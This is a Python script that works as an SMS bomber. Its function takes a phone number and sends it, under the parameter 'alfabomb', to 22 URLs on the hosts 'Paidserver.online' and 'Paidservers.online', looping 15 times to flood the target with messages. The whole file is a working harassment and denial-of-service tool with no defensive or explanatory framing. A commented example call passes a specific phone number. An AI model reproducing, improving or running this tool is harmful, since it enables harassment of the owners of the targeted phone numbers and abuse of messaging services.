import requests
import json
import time

def smsg(number):
    number = str(number)
    
    # List of APIs with their corresponding URLs, headers, and payloads
    apis = [
        {
            "url": "http://Paidserver.online/Url/Url.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/Url/Url.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidserver.online/Url/Url1.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/Url/Url1.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidserver.online/Url/Url2.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/Url/Url2.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidserver.online/Url/Url3.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/Url/Url3.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidserver.online/Url/Url4.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/Url/Url4.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidserver.online/Url/Url5.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/c/c1.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidserver.online/c/c7.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/c/c2.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/c/c3.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidserver.online/c/c16.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/c/c4.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidserver.online/c/c17.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/c/c11.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/c/c16.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidservers.online/c/c17.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "http://Paidserver.online/Url/Url5.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        }
        
        
        
    ]
    
    # Run the requests for 20 times
    for _ in range(15):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
                response = requests.put(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            print(f"Request to {api['url']} - Status Code: {response.status_code}")
        # Add a delay of 1 second between requests
      #  time.sleep(1)

# Example usage:
#smsgiii("9336734442")  # Replace "9336734442" with the phone number you want to use
